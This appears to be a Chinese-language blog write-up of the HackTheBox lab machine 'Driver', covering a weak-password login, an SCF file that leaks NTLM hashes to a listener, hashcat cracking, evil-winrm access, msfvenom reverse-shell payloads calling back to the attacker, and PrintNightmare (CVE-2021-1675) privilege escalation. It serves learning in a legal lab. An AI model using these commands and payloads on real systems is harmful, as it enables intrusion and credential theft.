---
title: HackTheBox-Dirver
typora-root-url: ..
date: 2021-12-07 21:18:04
tags:
 - HTB
 - SMB
---



## 初步尝试

访问 10.10.11.106 ，弹出 basic 认证界面，输入 admin:admin 可直接弱密码进入

![image-20211207212043408](/assets/image-20211207212043408.png)

进入后只有一个页面固件上传页面是可用的，但不知道文件上传到哪了

使用nmap进行扫描，结果如下：

```bash
nmap  -A -sV -sC -p- 10.10.11.106
```

![image-20211207212236347](/assets/image-20211207212236347.png)

可以发现是开了  135  445  5985  端口

## 学习知识

通过 作弊 ，知道了SCF 文件攻击 这个术语

> SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，这并不是什么新鲜事。

结合上面发现的文件上传点，我们知道会有人定时去查看该文件夹，也就是提示了可以触发SCF漏洞，这里有三种利用方式。



### 通过NTLM捕获SMB攻击

一个 SCF 文件可以用来访问一个特定的 UNC 路径，允许渗透测试人员构建攻击。下面的代码可以被放置在一个文本文件，然后需要被植入到网络共享。



```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

然后通过 responder 命令接收来自客户端的挑战

```bash
responder -wrf -I eth0
```

注：下图是存在问题的，抓到的NTLM存在问题，后来在kali上可正常运行

![image-20211207220539265](/assets/image-20211207220539265.png)

或者使用 msf 的 `auxiliary/server/capture/smb` 模块接收(未成功)

#### 爆破 密码(hashcat)

```bash
hashcat -m 5600 hash.txt rockyou.txt --self-test-disable
```

注：由于上面抓到的NTLMV2有问题，导致爆破存在问题，后来在kali上可正常运行

![image-20211207222632895](/assets/image-20211207222632895.png)

#### 直接获取shell

利用msf 框架实现攻击

```bash
use exploit/windows/smb/smb_relay
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.16.7
set smbhost 192.168.0.100
set srvport 8080
exploit
```

失败，估计是没权限

#### evil-winrm

evil-winrm是Windows远程管理(WinRM) Shell的终极版本。

Windows远程管理是“WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。

此程序可在启用此功能的任何Microsoft Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。因此，我们说它可用于黑客攻击的后利用/渗透测试阶段。相对于攻击者来说，这个程序能为他们提供更好更简单易用的功能。当然，系统管理员也可以将其用于合法目的，但其大部分功能都集中于黑客攻击/渗透测试。

```
gem install evil-winrm
```

基础使用

```
evil-winrm  -i 10.10.11.106 -u tony -p 'liltony' 
```



#### sbmclient 查看共享文件夹

```
smbclient -L \\\\192.168.0.21\\ -U tony
```

### 上传payload获取shell

生成exe payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=445 -f exe > hack.exe
```

通过 evil-winrm 上传到client上，msf 监听端口

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.211.55.5
set LPORT 445
exploit
```

![image-20211208142704596](/assets/image-20211208142704596.png)

尝试提权失败

```
use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

执行完无反应，暂停测试



### 使用 CVE-2021-1675 提权

生成 反弹shell Dll,上传到系统上

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<My IP> LPORT=8000 -f dll -o dll.dll
```

使用项目  https://github.com/cube0x0/CVE-2021-1675 

执行命令

```bash
python3 CVE-2021-1675.py driver.htb/tony:passwd@10.10.11.106 'C:\Users\tony\Documents\dll.dll'
```

监听端口

```
nc -lvvp 8000
```

![image-20211208164615041](/assets/image-20211208164615041.png)

收到反弹shell

![image-20211208164747127](/assets/image-20211208164747127.png)

 

## 总结

我这个菜鸡接触了一个全新的领域，学习了一波知识。但没有系统的概念，导致看到端口也想不出来存在漏洞。还是需要更多的沉淀，学习。多学习window及域相关安全，才能更好做好工作，提升个人能力短板。

## 参考资料

- https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
- https://www.freebuf.com/sectool/210479.html
- https://baijiahao.baidu.com/s?id=1714776706313648285&wfr=spider&for=pc
